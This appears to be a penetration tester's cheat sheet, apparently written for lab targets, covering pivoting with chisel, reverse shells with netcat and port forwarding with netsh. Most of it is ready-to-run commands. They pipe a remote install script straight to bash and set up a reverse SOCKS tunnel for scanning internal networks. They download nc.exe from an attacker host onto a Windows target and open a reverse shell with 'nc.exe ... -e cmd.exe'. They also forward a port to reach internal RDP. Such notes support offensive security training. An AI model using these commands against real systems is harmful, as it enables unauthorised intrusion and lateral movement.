## CHISEL

1. Install on attack box: `curl https://i.jpillora.com/chisel! | bash`
2. Edit /etc/proxychains.conf > socks5 127.0.0.1 1080
3. Run server: `chisel server -p 8001 —reverse`
4. Run client:  `.\chisel.exe client 10.10.14.179:8001 R:1080:socks`
5. Run command: `proxychains4 -q nmap ip-address`
6. Links:
    1. [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
    2. [https://ap3x.github.io/posts/pivoting-with-chisel/](https://ap3x.github.io/posts/pivoting-with-chisel/)

## NETCAT
1. Download on windows host: `Invoke-WebRequest -Uri [http://10.10.14.144:9999/nc.exe](http://10.10.14.144:9999/nc.exe) -OutFile nc.exe -UseBasicParsing`
2. Run nc on atack host: `nc -nlvp 4444`
3. Run nc on target: `nc.exe 10.10.14.144 4444 -e cmd.exe`

## NETSH.EXE
1. Using Netsh.exe to Port Forward `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25`
2. Verifying Port Forward `netsh.exe interface portproxy show v4tov4`
3. Connecting to the Internal Host through the Port Forward `xfreerdp /v:ip-address:port /u:user /p:password`